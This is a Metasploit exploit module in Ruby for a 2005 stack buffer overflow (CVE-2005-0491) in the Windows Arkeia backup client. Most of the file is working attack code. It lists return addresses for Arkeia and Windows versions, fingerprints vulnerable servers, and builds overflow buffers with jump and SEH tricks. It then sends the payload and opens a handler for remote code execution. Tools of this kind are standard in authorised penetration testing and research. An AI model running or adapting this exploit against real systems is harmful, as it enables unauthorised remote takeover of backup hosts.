##
# $Id: type77.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Arkeia
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Arkeia Backup Client Type 77 Overflow (Win32)',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the Arkeia backup
				client for the Windows platform. This vulnerability affects
				all versions up to and including 5.3.3.
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2005-0491' ],
					[ 'OSVDB', '14011'],
					[ 'BID', '12594'],
					[ 'URL', 'http://lists.netsys.com/pipermail/full-disclosure/2005-February/031831.html'],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
				},
			'Targets'        =>
				[
					['Arkeia 5.3.3 and 5.2.27 Windows (All)',  { 'Platform' => 'win', 'Rets' => [ 0x004130a2, 5 ] }], # arkeiad.exe
					['Arkeia 5.2.27 and 5.1.19 Windows (All)', { 'Platform' => 'win', 'Rets' => [ 0x00407b9c, 5 ] }], # arkeiad.exe
					['Arkeia 5.3.3 and 5.0.19 Windows (All)',  { 'Platform' => 'win', 'Rets' => [ 0x0041d6b9, 5 ] }], # arkeiad.exe
					['Arkeia 5.1.19 and 5.0.19 Windows (All)', { 'Platform' => 'win', 'Rets' => [ 0x00423264, 5 ] }], # arkeiad.exe
					['Arkeia 5.x Windows 2000 English',        { 'Platform' => 'win', 'Rets' => [ 0x75022ac4, 5 ] }], # ws2help.dll
					['Arkeia 5.x Windows XP English SP0/SP1',  { 'Platform' => 'win', 'Rets' => [ 0x71aa32ad, 5 ] }], # ws2help.dll
					['Arkeia 5.x Windows NT 4.0 SP4/SP5/SP6',  { 'Platform' => 'win', 'Rets' => [ 0x77681799, 5 ] }], # ws2help.dll
					['Arkeia 4.2 Windows 2000 English',        { 'Platform' => 'win', 'Rets' => [ 0x75022ac4, 4 ] }], # ws2help.dll
					['Arkeia 4.2 Windows XP English SP0/SP1',  { 'Platform' => 'win', 'Rets' => [ 0x71aa32ad, 4 ] }], # ws2help.dll
					['Arkeia 4.2 Windows NT 4.0 SP4/SP5/SP6',  { 'Platform' => 'win', 'Rets' => [ 0x77681799, 4 ] }], # ws2help.dll
					['Arkeia 4.2 Windows 2000 German',         { 'Platform' => 'win', 'Rets' => [ 0x74fa1887, 4 ] }], # ws2help.dll
				],
			'DisclosureDate' => 'Feb 18 2005',
			'DefaultTarget' => 0))
	end

	def check
		info = arkeia_info()
		if !(info and info['Version'])
			return Exploit::CheckCode::Safe
		end

		print_status("Arkeia Server Information:")
		info.each_pair { |k,v|
			print_status("   #{k + (" " * (30-k.length))} = #{v}")
		}

		if (info['System'] !~ /Windows/)
			print_status("This module only supports Windows targets")
			return Exploit::CheckCode::Detected
		end

		if (info['Version'] =~ /Backup (4\.|5\.([012]\.|3\.[0123]$))/)
			return Exploit::CheckCode::Vulnerable
		end

		return Exploit::CheckCode::Safe
	end

	def exploit
		connect

		print_status("Trying target #{target.name}...")

		head = "\x00\x4d\x00\x03\x00\x01\xff\xff"
		data = (target['Rets'][1] == 5) ? prep_ark5() : prep_ark4()
		head[6, 2] = [data.length].pack('n')

		begin
			sock.put(head)
			sock.put(data)
			sock.get_once
		rescue IOError, EOFError => e
			print_status("Exception: #{e.class}:#{e}")
		end
		handler
		disconnect
	end

	def prep_ark5
		data = rand_text_english(4096, payload_badchars)
		data[1176, 4] = [target['Rets'][0]].pack('V')
		data[1172, 2] = "\xeb\xf9"
		data[1167, 5] = "\xe98" + [-1172].pack('V')
		data[0, payload.encoded.length] = payload.encoded
	end

	def prep_ark4
		data = rand_text_english(4096, payload_badchars)
		seh = generate_seh_payload( target['Rets'][0] )
		data[ 96, seh.length] = seh
	end

end
